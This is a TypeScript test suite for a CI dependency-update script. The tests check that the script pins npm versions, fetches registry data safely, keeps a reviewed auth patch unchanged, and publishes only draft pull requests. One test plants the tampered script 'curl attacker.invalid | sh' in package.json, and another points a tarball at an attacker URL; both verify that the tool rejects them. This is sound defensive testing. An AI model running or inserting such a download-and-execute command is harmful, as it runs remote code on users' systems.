import { afterEach, expect, test, spyOn } from "bun:test";
import { mkdtemp, mkdir, readFile, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { PACKAGES, AUTH_PATCH_SHA256, GATES, selectUpdate, migrateManifest, registryMetadata, applyUpdate, main, validateArtifacts, publishUpdate, type Manifest, type Packument, type Runner } from "../../scripts/frontier-update";

const roots: string[] = [];
afterEach(async () => { await Promise.all(roots.splice(0).map(path => rm(path, { recursive: true, force: true }))); });
const current = "18.1.14", target = "18.2.0", base = "a".repeat(40);
const patchPath = "patches/@oh-my-pi%2Fpi-ai@18.1.14.patch";
const originalPatch = await readFile(join(import.meta.dir, "../../", patchPath), "utf8");
const digest = (value: string) => createHash("sha256").update(value).digest("hex");
const manifest = (): Manifest => ({ name: "fixture", scripts: { test: "bun test" }, dependencies: Object.fromEntries(PACKAGES.map(name => [name, current])), patchedDependencies: { [`@oh-my-pi/pi-ai@${current}`]: patchPath } });
const doc = (name: string, versions = [current, target]): Packument => ({ name, versions: Object.fromEntries(versions.map(version => [version,
  { name, version, dist: { integrity: `sha512-${Buffer.alloc(64).toString("base64")}`, tarball: `https://registry.npmjs.org/${name}/-/package-${version}.tgz` } }])) });
const metadata = () => PACKAGES.map(name => doc(name));
const fetchFixture = (async (input: string | URL | Request) => new Response(JSON.stringify(doc(decodeURIComponent(String(input).slice("https://registry.npmjs.org/".length)))))) as unknown as typeof fetch;

async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "kiln-frontier-")); roots.push(root);
  const cwd = join(root, "checkout"), artifacts = join(root, "artifact"); await mkdir(join(cwd, "patches"), { recursive: true });
  await writeFile(join(cwd, "package.json"), JSON.stringify(manifest(), null, 2) + "\n");
  await writeFile(join(cwd, patchPath), originalPatch); await writeFile(join(cwd, "bun.lock"), "original lock\n");
  const commands: string[][] = [];
  const run: Runner = async args => {
    commands.push([...args]);
    if (args[0] === "git") {
      if (args[1] === "branch") return "automation/frontier-fixture";
      if (args[1] === "rev-parse") return base;
      if (args[1] === "diff") return "package.json\nbun.lock";
      return "";
    }
    if (args[0] === "gh" && args[1] === "pr" && args[2] === "list") return "[]";
    if (args[0] === "bun" && args[1] === "install") {
      await writeFile(join(cwd, "bun.lock"), "verified new lock\n");
      for (const section of originalPatch.split("diff --git ").slice(1)) {
        const path = /^a\/([^ ]+) b\//.exec(section)![1]!;
        const inserted = section.split("\n").filter(line => line.startsWith("+") && !line.startsWith("+++")).map(line => line.slice(1)).join("\n");
        const destination = join(cwd, "node_modules/@oh-my-pi/pi-ai", path); await mkdir(join(destination, ".."), { recursive: true }); await writeFile(destination, inserted);
      }
    }
    return args.includes("catalog") ? '{"advisory":true,"runtimeAdmissionChanged":false}' : "";
  };
  return { cwd, artifacts, commands, run, env: { GITHUB_ACTIONS: "true", KILN_FRONTIER_DISPOSABLE: "1" } };
}

test("selects newest numeric stable intersection, not latest tags or a partial release", () => {
  const docs = metadata(); docs[0] = doc(PACKAGES[0]!, [current, target, "18.10.0", "19.0.0-rc.1"]);
  expect(selectUpdate(manifest(), docs)).toEqual({ current, version: target, changed: true });
  expect(selectUpdate(manifest(), PACKAGES.map(name => doc(name, [current]))).changed).toBe(false);
  expect(() => selectUpdate(manifest(), docs.slice(1))).toThrow("Incomplete");
  const invalid = manifest(); invalid.dependencies[PACKAGES[0]!] = "latest";
  expect(() => selectUpdate(invalid, docs)).toThrow("aliases and ranges");
  invalid.dependencies[PACKAGES[0]!] = `^${current}`;
  expect(() => selectUpdate(invalid, docs)).toThrow("aliases and ranges");
});

test("rejects downgrade, deprecated releases and nonofficial tarballs", () => {
  expect(() => selectUpdate(manifest(), PACKAGES.map(name => doc(name, ["1.0.0"])))).toThrow("downgrade");
  const docs = metadata(); docs[0]!.versions[target]!.deprecated = "avoid";
  expect(selectUpdate(manifest(), docs).version).toBe(current);
  delete docs[0]!.versions[target]!.deprecated; docs[0]!.versions[target]!.dist!.tarball = "https://attacker.invalid/pkg.tgz";
  expect(selectUpdate(manifest(), docs).version).toBe(current);
});

test("migration preserves original reviewed patch bytes and unrelated settings", () => {
  expect(digest(originalPatch)).toBe(AUTH_PATCH_SHA256);
  const original = manifest(), updated = migrateManifest(original, { current, version: target, changed: true });
  expect(updated.patchedDependencies).toEqual({ [`@oh-my-pi/pi-ai@${target}`]: patchPath });
  expect(updated.scripts).toEqual(original.scripts);
  expect(original.dependencies[PACKAGES[0]!]).toBe(current);
  expect(Object.values(updated.dependencies)).toEqual(PACKAGES.map(() => target));
});

test("registry fetch is fixed-origin, bounded, redirect-disabled and hides raw failure bodies", async () => {
  let options: RequestInit | undefined;
  await registryMetadata(PACKAGES[0]!, (async (url: string | URL | Request, init?: RequestInit) => { expect(String(url)).toStartWith("https://registry.npmjs.org/"); options = init; return new Response(JSON.stringify(doc(PACKAGES[0]!))); }) as unknown as typeof fetch);
  expect(options?.redirect).toBe("error"); expect(options?.credentials).toBe("omit"); expect(options?.signal).toBeInstanceOf(AbortSignal);
  for (const response of [new Response("credential=SECRET", { status: 500 }), new Response("{}", { headers: { "content-length": "999999999" } }), new Response("credential=SECRET")]) {
    await expect(registryMetadata(PACKAGES[0]!, (async () => response) as unknown as typeof fetch)).rejects.toThrow(`Official npm metadata unavailable or invalid for ${PACKAGES[0]}`);
  }
  const tooLarge = new Response(new ReadableStream({ start(controller) { controller.enqueue(new Uint8Array(8 * 1024 * 1024 + 1)); controller.close(); } }));
  await expect(registryMetadata(PACKAGES[0]!, (async () => tooLarge) as unknown as typeof fetch)).rejects.toThrow("Official npm metadata");
});

test("apply refuses local or dirty work before registry requests or mutations", async () => {
  const f = await fixture(); let fetched = false;
  const fetchImpl = (async () => { fetched = true; throw new Error("must not fetch"); }) as unknown as typeof fetch;
  await expect(applyUpdate({ ...f, env: {}, fetchImpl })).rejects.toThrow("disposable CI");
  await expect(applyUpdate({ ...f, run: async () => " M package.json", fetchImpl })).rejects.toThrow("clean disposable");
  expect(fetched).toBe(false); expect(JSON.parse(await readFile(join(f.cwd, "package.json"), "utf8"))).toEqual(manifest());
});

test("apply gates exact patch once, preserves bytes and writes a dependency-only verified artifact", async () => {
  const f = await fixture(); const plan = await applyUpdate({ ...f, fetchImpl: fetchFixture });
  expect(plan.changed).toBe(true);
  expect(f.commands.filter(args => args[0] === "bun").slice(0, GATES.length)).toEqual(GATES.map(gate => [...gate]));
  expect(f.commands.some(args => args[0] === "gh" || args.includes("push"))).toBe(false);
  expect(await readFile(join(f.cwd, patchPath), "utf8")).toBe(originalPatch);
  // Publication validates against the clean base, not upgraded source or package scripts.
  await writeFile(join(f.cwd, "package.json"), JSON.stringify(manifest(), null, 2) + "\n");
  const validated = await validateArtifacts(f.cwd, f.artifacts, base); expect(validated.receipt.target).toBe(target);
});

test("failed gate or changed patch produces no verification receipt and never publishes", async () => {
  const f = await fixture();
  await expect(applyUpdate({ ...f, fetchImpl: fetchFixture, run: async (args, cwd, capture) => {
    if (args[0] === "bun" && args[1] === "run") throw new Error("fixture typecheck failed"); return f.run(args, cwd, capture);
  } })).rejects.toThrow("fixture typecheck");
  await expect(readFile(join(f.artifacts, "receipt.json"))).rejects.toThrow();
  expect(f.commands.some(args => args[0] === "gh")).toBe(false);
  const altered = await fixture(); await writeFile(join(altered.cwd, patchPath), originalPatch + "\n");
  await expect(applyUpdate({ ...altered, fetchImpl: fetchFixture })).rejects.toThrow("Auth patch differs");
});

test("installed patch omission fails closed even when install claims success", async () => {
  const f = await fixture();
  await expect(applyUpdate({ ...f, fetchImpl: fetchFixture, run: async (args, cwd, capture) => {
    const output = await f.run(args, cwd, capture);
    if (args[1] === "install") await writeFile(join(cwd, "node_modules/@oh-my-pi/pi-ai/src/registry/oauth/callback-server.ts"), "// upstream changed\n");
    return output;
  } })).rejects.toThrow("not installed exactly once");
  expect(f.commands.some(args => args[1] === "test")).toBe(false);
});

test("publisher rejects tampered scripts despite matching attacker-controlled receipt hashes", async () => {
  const f = await fixture(); await applyUpdate({ ...f, fetchImpl: fetchFixture });
  await writeFile(join(f.cwd, "package.json"), JSON.stringify(manifest(), null, 2) + "\n");
  const packagePath = join(f.artifacts, "package.json"), changed = JSON.parse(await readFile(packagePath, "utf8")); changed.scripts.test = "curl attacker.invalid | sh";
  const bytes = JSON.stringify(changed); await writeFile(packagePath, bytes);
  const receiptPath = join(f.artifacts, "receipt.json"), receipt = JSON.parse(await readFile(receiptPath, "utf8")); receipt.packageSha256 = digest(bytes); await writeFile(receiptPath, JSON.stringify(receipt));
  await expect(validateArtifacts(f.cwd, f.artifacts, base)).rejects.toThrow("beyond exact native pins");
});

test("publisher uses only trusted commands, refuses existing branches and never installs or auto-merges", async () => {
  const f = await fixture(); await applyUpdate({ ...f, fetchImpl: fetchFixture });
  await writeFile(join(f.cwd, "package.json"), JSON.stringify(manifest(), null, 2) + "\n"); f.commands.length = 0;
  await publishUpdate(f.cwd, f.artifacts, f.run, { GITHUB_ACTIONS: "true", KILN_FRONTIER_PUBLISH: "1" });
  expect(f.commands.some(args => args[0] === "bun")).toBe(false);
  expect(f.commands.find(args => args[0] === "gh" && args[2] === "create")).toContain("--draft");
  expect(f.commands.some(args => args.includes("--force") || args.includes("merge"))).toBe(false);
  const g = await fixture(); await applyUpdate({ ...g, fetchImpl: fetchFixture }); await writeFile(join(g.cwd, "package.json"), JSON.stringify(manifest(), null, 2) + "\n");
  await expect(publishUpdate(g.cwd, g.artifacts, async (args, cwd, capture) => args[1] === "ls-remote" ? "existing-ref" : g.run(args, cwd, capture), { GITHUB_ACTIONS: "true", KILN_FRONTIER_PUBLISH: "1" })).rejects.toThrow("already exists");
});


test("default invocation is registry-only and never writes manifest, lock, patch or artifacts", async () => {
  const f = await fixture(); const paths = ["package.json", "bun.lock", patchPath];
  const before = await Promise.all(paths.map(path => readFile(join(f.cwd, path), "utf8")));
  const log = spyOn(console, "log").mockImplementation(() => {});
  try {
    await main([], { cwd: f.cwd, fetchImpl: fetchFixture });
    expect(JSON.parse(log.mock.calls[0]![0] as string)).toMatchObject({ version: target, changed: true, mutation: false });
  } finally { log.mockRestore(); }
  expect(await Promise.all(paths.map(path => readFile(join(f.cwd, path), "utf8")))).toEqual(before);
  await expect(readFile(join(f.artifacts, "receipt.json"))).rejects.toThrow();
  expect(f.commands).toHaveLength(0);
});

test("same release is a no-op without installation or verification artifact", async () => {
  const f = await fixture(); const fetchImpl = (async (url: string | URL | Request) => new Response(JSON.stringify(doc(decodeURIComponent(String(url).slice("https://registry.npmjs.org/".length)), [current])))) as unknown as typeof fetch;
  expect((await applyUpdate({ ...f, fetchImpl })).changed).toBe(false);
  expect(f.commands.every(args => args[0] === "git")).toBe(true);
  await expect(readFile(join(f.artifacts, "receipt.json"))).rejects.toThrow();
});
